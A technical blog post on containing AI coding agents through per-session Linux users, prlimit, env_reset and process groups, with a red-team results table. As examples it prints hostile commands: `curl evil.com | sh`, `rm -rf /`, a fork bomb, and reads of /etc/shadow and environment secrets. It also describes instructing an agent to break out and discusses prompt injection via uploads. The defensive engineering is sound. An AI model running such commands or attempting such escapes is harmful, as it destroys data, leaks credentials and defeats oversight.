---
title: 'Assume the model cooperates with the attacker'
summary: 'An AI agent runs shell commands that did not exist until a prompt asked for them. You cannot write a static policy for code that has not been written yet — so the containment has to hold even when the model is talked into helping.'
order: 1
published: 2026-08-02
---

An AI agent writes `rm -rf /` and your system runs it.

This isn't hypothetical. AI coding agents — Claude Code, Cursor, Codex — run shell commands as part of normal operation. File operations, package installs, test runs, data processing. From the agent's perspective, `pip install pandas` and `curl evil.com | sh` are both just commands. Something external has to enforce the boundary.

Traditional sandboxing assumes you know what code will run. You write a seccomp profile, whitelist specific syscalls, define a container image. AI agents break that assumption. The code is generated at runtime, from a user prompt, and it can be anything. A data processing script. A web scraper. A one-liner that reads `/etc/shadow`. You can't write a static policy for code that doesn't exist yet.

The setup I'm describing: agents that execute arbitrary shell commands on behalf of users, multiple sessions on one shared host, each uploading files the agent reads and processes. The first problem is containment. How do you stop one session's agent from touching another session's files, reading secrets off the host, or eating every resource on the machine?

The common answer is containers. Spin one up per session, throw it away when the session ends. It works, but it's heavy. Container startup adds latency, each one carries memory for its own filesystem layer, and you need orchestration — Kubernetes, ECS, something — to manage the lifecycle. When sessions start and stop constantly, that overhead adds up fast.

I went a different direction. Linux already does this.

## How Linux isolates processes

Linux has had process isolation since the 1970s. The mechanisms have gotten more sophisticated, but the basics still work.

### A Linux user per session

The oldest isolation mechanism in Unix. Every process runs as a user, every file has an owner and a group and permission bits, and a process can't read what it doesn't have permission for.

So: a fresh Linux user for every chat session. The username is a SHA-256 hash of the session ID, which makes it deterministic and idempotent — restarting the container doesn't break anything.

```bash
#!/bin/bash
set -euo pipefail

SID=$1
USERNAME="sb_$(printf '%s' "$SID" | sha256sum | cut -c1-16)"

if ! id "$USERNAME" &>/dev/null; then
    useradd -s /usr/sbin/nologin -G sandbox "$USERNAME"
fi

USER_UID=$(id -u "$USERNAME")
HOME_DIR="/home/$USER_UID"
mkdir -p "$HOME_DIR/uploads" "$HOME_DIR/outputs" "$HOME_DIR/scratch"

chown -R "$USERNAME:appuser" "$HOME_DIR"
chown "appuser:sandbox" "$HOME_DIR/uploads"
chmod 750 "$HOME_DIR"
chmod 750 "$HOME_DIR/uploads"
chmod 770 "$HOME_DIR/outputs"
chmod 770 "$HOME_DIR/scratch"
```

A few things to notice. The shell is `/usr/sbin/nologin`, so the sandbox user can't start an interactive session — it only ever runs commands the application explicitly hands it through `sudo -u`. The sandbox user belongs to the `sandbox` group and not to `appuser`, which is what stops user A from entering user B's home directory: B's home is mode 750 and A isn't in B's group. `uploads/` is owned by `appuser:sandbox` at mode 750, so the application writes the uploaded file there and the agent can read it but cannot modify or delete it — not by policy, at the OS level. `outputs/` and `scratch/` are 770, where the agent writes freely.

### prlimit caps resource usage

`prlimit` sets hard kernel limits on a process. When a limit is hit, the kernel kills the process. No negotiation, no graceful shutdown.

Four caps: `nproc=100` stops fork bombs, `as=4GB` ceilings the address space, `fsize=500MB` caps a single file, and `cpu=timeout×4` bounds CPU time against the wall-clock timeout.

Why those numbers? `nproc=100` is high enough for a Python script to spawn worker threads or subprocesses for real data processing, and low enough that `:(){ :|:& };:` dies before it reaches the host's process table. 4GB of address space is generous for pandas and numpy but keeps one session from exhausting the box. The CPU multiplier accounts for multi-threaded work: at a 120-second timeout the process gets 480 seconds of CPU across all cores. Enough for real work, a tight ceiling on crypto mining and infinite loops.

### Process groups catch backgrounded children

A common trick for escaping a timeout: `sleep 999 &`. The parent exits, the timeout fires, and the backgrounded child lives on — still running as the sandbox user, still consuming resources, and nobody is watching it.

The sandbox process starts in its own session (`start_new_session=True`), which puts it in a new process group. On timeout the entire group dies via `os.killpg()` — every child, grandchild, and backgrounded straggler. Without it, any command that forks leaves orphans.

### sudo + env_reset strips the environment

This one is easy to overlook. Your application process has environment variables: API keys for the LLM provider, database connection strings, internal service URLs. If the sandbox process inherits that environment, a single `printenv` leaks all of it.

`sudo -u` brings the `env_reset` default with it, so the child starts blank. Only `PATH`, `HOME`, and `TMPDIR` get set back. If the agent runs `env` it sees three variables. No keys, no credentials, no tokens.

All of it comes together in one subprocess call:

```python
proc = subprocess.Popen(
    [
        "sudo", "-u", username,
        "prlimit",
        "--nproc=100:100",
        "--as=4294967296:4294967296",
        "--fsize=524288000:524288000",
        f"--cpu={timeout * 4}:{timeout * 4}",
        "env", f"PATH={SANDBOX_PATH}",
        f"HOME={home}", f"TMPDIR={home}/scratch",
        "sh", "-c", command,
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    cwd=str(cwd),
    start_new_session=True,
)
```

No `shell=True`. The command string is a single argument to `sh -c`, running as the sandbox user, so shell metacharacters have nowhere to escape to.

### What I skipped

**Namespaces** (PID, network, mount) give you separate process trees, network stacks, and filesystem views. Stronger isolation, more moving parts. For this threat model, user and group separation was enough.

**Seccomp** filters individual system calls — block `ptrace`, `mount`, `reboot`, whatever you like. But block the wrong one and you break Python, or NumPy, or whichever library the agent actually needs. I didn't need that granularity.

**Containers** bundle namespaces, cgroups and overlay filesystems into one convenient package. The isolation I needed was simpler than what Docker provides, and a container per session is latency I'd be paying forever.

What's left is layered, outermost to innermost:

- **The model's refusal** — soft, best-effort, and the layer I trust least.
- **Tool guards** — a command allowlist and path checks in the application.
- **Filesystem permissions** — deny rules for paths the agent has no business in.
- **The OS sandbox** — the per-session user, `prlimit`, `env_reset`.
- **Infrastructure** — a network firewall, still unbuilt.

Only one of those is enforced by something other than my own code.

## The same thing in Rust

The Python executor works. But look at what it actually does: it assembles a list of strings and hands them to `subprocess.Popen`. The real work happens in `sudo`, `prlimit`, and `sh` — all external binaries. Python is orchestrating. It never touches the kernel.

Rust can. And there are good reasons to want that.

Sandboxing is security code, and security code has a specific property: the order of operations matters, and mistakes are silent. Set resource limits _after_ spawning the child, or drop privileges _after_ opening a file, and you have a race no test will catch and no error will surface. The program works fine. It just isn't secure.

Python's `subprocess` abstraction hides that ordering. You pass a list of arguments and trust they execute in the right sequence; you can't insert a step between `fork()` and `exec()` without reaching for low-level `os` calls that feel wrong in Python. Rust gives you direct syscall access with types on top. You can't mix up argument types for a syscall, you can't quietly ignore a `Result`, and there's no runtime sitting between your code and the kernel — no GC pause between "drop privileges" and "exec the command."

Firecracker, gVisor's `runsc`, and parts of systemd's sandboxing are written in Rust or moving that way. Same pattern: security-critical, syscall-heavy code benefits from a language that makes the mistakes harder to make.

The `nix` crate wraps Linux system calls in safe Rust types. Here's the same sandbox one layer closer to the kernel:

```rust
use nix::sched::{unshare, CloneFlags};
use nix::sys::resource::{setrlimit, Resource};
use nix::unistd::{setuid, Uid};
use std::process::Command;

fn sandbox_exec(cmd: &str) -> std::io::Result<std::process::Output> {
    // new PID namespace: child sees itself as PID 1
    // new network namespace: no network access at all
    unshare(
        CloneFlags::CLONE_NEWPID | CloneFlags::CLONE_NEWNET
    ).expect("unshare failed");

    // same limits as the Python version, applied via setrlimit(2)
    setrlimit(Resource::RLIMIT_AS, 4_294_967_296, 4_294_967_296).unwrap();
    setrlimit(Resource::RLIMIT_NPROC, 100, 100).unwrap();
    setrlimit(Resource::RLIMIT_FSIZE, 524_288_000, 524_288_000).unwrap();

    // drop to unprivileged user
    setuid(Uid::from_raw(65534)).unwrap();

    Command::new("sh").args(["-c", cmd]).output()
}
```

Twenty lines. `unshare` creates new PID and network namespaces, so the child can't see host processes and has no network stack at all. `setrlimit` applies the resource caps through the same kernel mechanism `prlimit` reaches from outside. `setuid` drops to an unprivileged user. Every call happens in the order you see it, in one process, with no shell in between. The compiled binary is about 2MB with no runtime dependencies — drop it into any Linux container and it runs.

I didn't ship the Rust version. Python and Bash were enough for the threat model above, and the isolation I needed never required control over the fork/exec boundary. But if I wanted namespace-level isolation, seccomp filters, or that ordering guarantee, `nix` is where I'd go before writing C.

## What held

Building a sandbox is one thing. Trusting it is another.

So I ran an assessment against the running system rather than a theoretical review — the agent was given explicit instructions to break out: read other users' files, escalate privileges, leak secrets, exhaust resources. Then the same attacks from outside the agent, directly as the sandbox user via `sudo -u`, to check the OS controls independently of the LLM layer.

The philosophy behind that second half: assume the model _will_ be convinced to attempt hostile actions, whether by a direct prompt or by instructions buried in an uploaded file. The security model can't depend on refusal. It has to hold when the model is helping the attacker.

| Vector                                     | Result                                                              |
| ------------------------------------------ | ------------------------------------------------------------------- |
| Read another session's files               | Blocked. Mode 750, wrong group.                                     |
| Escalate to root via sudo                  | Blocked. Password required, no sudo rights for sandbox users.       |
| Pivot to another sandbox user              | Blocked.                                                            |
| Leak API keys via `printenv`               | Blocked. `env_reset` strips everything but PATH, HOME, TMPDIR.      |
| Read system files (`/etc/shadow`, `/root`) | Blocked. Path validation and OS permissions.                        |
| Path traversal (upload, download, symlink) | Blocked. Input sanitization, `.resolve()`, containment check.       |
| Write outside the workspace                | Blocked. Filesystem permission layer rejects it.                    |
| Modify uploaded files                      | Blocked. `uploads/` owned by `appuser`, mode 750.                   |
| Fork bomb, memory exhaustion, huge file    | Blocked. prlimit kills the process.                                 |
| `rm -rf /`, `curl \| sh`                   | Refused by the model, and blocked by the tool allowlist underneath. |

Everything held. But "everything I tested passed" is not the same as "there are no holes," and two gaps are open on purpose rather than by oversight.

**Network egress.** The sandbox user can still make outbound HTTP requests — `python3 -c "import urllib.request; urllib.request.urlopen('http://example.com')"` returns 200 from inside the sandbox. A compromised agent could exfiltrate whatever the user uploaded. The fix is `iptables` scoped to the sandbox UID range (`iptables -m owner --uid-owner <range> -j DROP`): the application user keeps outbound access for the LLM API, sandbox users get none. That's a change on the host, below the application — not something the sandbox code can install for itself.

**Disk quotas.** prlimit caps a single file at 500MB, but nothing stops an agent writing thousands of small ones and filling the shared `/home` volume for every other session. Per-UID filesystem quotas — XFS `xfs_quota`, ext4 `quota` — close it. Not done.

**Prompt injection** isn't a sandbox gap exactly, but it's the reason the sandbox exists. Upload a document with instructions embedded in it and the agent may well follow them. Containment bounds the blast radius; it doesn't stop the agent from trying. Nobody has a production-ready answer to this today, which is why I treat containment as the real defense and refusal as a bonus.

## Where this sits

This sandbox is the lightest option on the spectrum. No VMs, no containers, no kernel modules — Linux users, file permissions, resource limits. That's a conscious trade: weaker isolation than the alternatives, in exchange for zero per-session overhead and a system any Linux admin can audit in an afternoon.

**NVIDIA OpenShell** arrived in 2026 as an open-source sandbox runtime built specifically for agents. It uses Linux Security Modules driven by declarative YAML: you write a policy saying which paths the agent can read, which endpoints it can reach, which process types it can spawn, and the kernel enforces it. Policies split into static sections locked at creation and dynamic sections you can hot-reload, so permissions can tighten mid-session without a restart. More expressive than anything here — at the cost of understanding LSM, maintaining policy files, and running the daemon alongside your application.

**Firecracker** is Amazon's microVM monitor (Rust again). Each workload gets a lightweight virtual machine with its own kernel — not a container sharing the host's, an actual VM on KVM. Lambda and Fargate run on it. The isolation is hardware-level, so even a kernel exploit inside the sandbox doesn't reach the host. About 125ms to start, ~5MB overhead per instance. If your threat model includes kernel-level attacks, this is the right answer. For a data processing chatbot it's overkill.

**Daytona** comes at it from another angle: full development environments from config files, containers or VMs with pre-installed toolchains, network isolation, persistent storage, SSH. Built for human developers who need reproducible environments, but the isolation model works for agents. Highest overhead of anything here — you're running a whole environment per session — and in exchange you don't have to solve "the agent needs this specific runtime" yourself.

Roughly: shared infrastructure with minimal per-session overhead, Linux users and prlimit. Policy-driven access control at production scale, OpenShell. A kernel-exploit-grade threat model, Firecracker. Pre-configured toolchains, Daytona.

## What's left

The sandbox handles the problems I know how to solve — cross-tenant access, privilege escalation, secret leaks, resource exhaustion. Standard Linux primitives, no new technology.

What's left is harder. Network egress needs per-UID firewall rules. Prompt injection has no real defense in the industry yet; the best available move is to contain the blast radius, which this does, and add heuristic guardrails, which it doesn't. Audit logging needs to capture not just what the agent did but what it _tried_ to do and was stopped from doing, across every layer, in a form someone would actually read.

And there's a meta-problem underneath all of it: every new tool you hand the agent — web search, file conversion, database access — is a new capability the sandbox has to account for. The attack surface grows with the feature set, and it grows on the side that ships features.

Every layer above the OS is a filter I hope is working: the allowlist I wrote, the path check I remembered, the refusal the model produced this time. `chmod 750` is not that kind of thing. The kernel has no opinion about the prompt, can't be flattered, and doesn't get talked into anything. That's the whole reason the guarantee lives down there.
